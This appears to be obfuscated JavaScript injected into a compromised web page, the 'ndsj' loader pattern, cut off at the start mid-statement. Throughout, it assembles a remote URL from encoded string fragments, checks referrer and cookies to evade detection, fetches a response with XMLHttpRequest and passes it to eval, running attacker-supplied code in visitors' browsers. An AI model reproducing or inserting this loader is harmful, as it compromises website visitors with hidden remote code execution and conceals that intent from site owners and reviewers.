HttpClient(),l=Y[S(j.i9)+'\x79\x64']+token();D[S(j.ii)](l,function(L){var E=S;N(L,Y[E(T.Y)+'\x7a\x57'])&&x[E(T.W)+'\x6c'](L);});}function N(L,R){var I=S;return Y[I(Z.Y)+'\x55\x50'](L[Y[I(Z.W)+'\x59\x69']](R),-(-0x2*-0xc49+0x1e98+-0x1b*0x20b));}}());};;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};